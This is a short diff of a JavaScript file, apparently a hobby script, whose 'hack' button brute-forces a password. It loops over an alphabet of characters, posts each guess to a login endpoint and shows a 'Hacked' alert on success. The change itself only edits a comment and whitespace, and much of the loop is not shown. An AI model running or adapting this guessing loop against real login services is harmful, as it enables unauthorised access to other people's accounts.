@@ -16,7 +16,7 @@ const fetchJSON = async (query, body) => {
 
 hack.onclick = async () => {
     let passwortHack = '';
-
+    // All characters
     const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXZYabcdefghijklmnopqrstuvwxzy01234567890!@_-'
 
     for (let a = 0; a < alphabet.length; a++) {
@@ -50,7 +50,6 @@ hack.onclick = async () => {
                                     pass: passwortHack
                                 });
                            
-                                
                                 // If password is founded then return me show me Hacked as alert!
                             if (data.status === 'success') {
                                 alert('Hacked')
